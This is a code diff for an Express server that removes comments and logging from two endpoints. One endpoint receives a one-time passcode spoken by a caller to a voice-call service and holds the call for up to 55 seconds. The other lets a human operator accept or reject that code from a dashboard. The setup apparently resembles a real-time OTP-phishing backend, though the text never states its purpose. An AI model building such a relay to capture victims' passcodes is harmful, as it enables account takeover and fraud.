@@ -7,28 +7,22 @@ app.use(express.json());
 app.use(express.static('public'));
 
 const pending = {};
-const waiters = {}; // holds resolve functions for long-polling
+const waiters = {};
 
-// Bland calls this when caller speaks OTP
-// We hold the response open until human clicks Accept/Reject (up to 55 seconds)
-app.post('/submit-otp', (req, res) => {console.log('SUBMIT-OTP HIT:', req.body);
-
+app.post('/submit-otp', (req, res) => {
   const { session_id, otp } = req.body;
   if (!session_id || !otp) return res.status(400).json({ error: 'Missing fields' });
 
   pending[session_id] = { otp, status: 'pending', timestamp: Date.now() };
+  delete waiters[session_id];
 
-  // Wait up to 55 seconds for a human decision
   const timeout = setTimeout(() => {
-    delete waiters[session_id];
-    // If no decision made, default to rejected
     if (pending[session_id] && pending[session_id].status === 'pending') {
       pending[session_id].status = 'rejected';
     }
     res.json({ verification_status: 'rejected', message: 'Verification timed out' });
   }, 55000);
 
-  // Store the resolve so /decide can trigger it
   waiters[session_id] = (decision) => {
     clearTimeout(timeout);
     delete waiters[session_id];
@@ -39,16 +33,12 @@ app.post('/submit-otp', (req, res) => {console.log('SUBMIT-OTP HIT:', req.body);
   };
 });
 
-// Dashboard calls this when you click Accept/Reject
-app.post('/decide', (req, res) => {console.log('DECIDE HIT:', req.body);
-console.log('PENDING KEYS:', Object.keys(pending));
-                                  
+app.post('/decide', (req, res) => {
   const { session_id, decision } = req.body;
   if (!pending[session_id]) return res.status(404).json({ error: 'Not found' });
 
   pending[session_id].status = decision;
 
-  // If Bland is still waiting, respond to it now
   if (waiters[session_id]) {
     waiters[session_id](decision);
   }
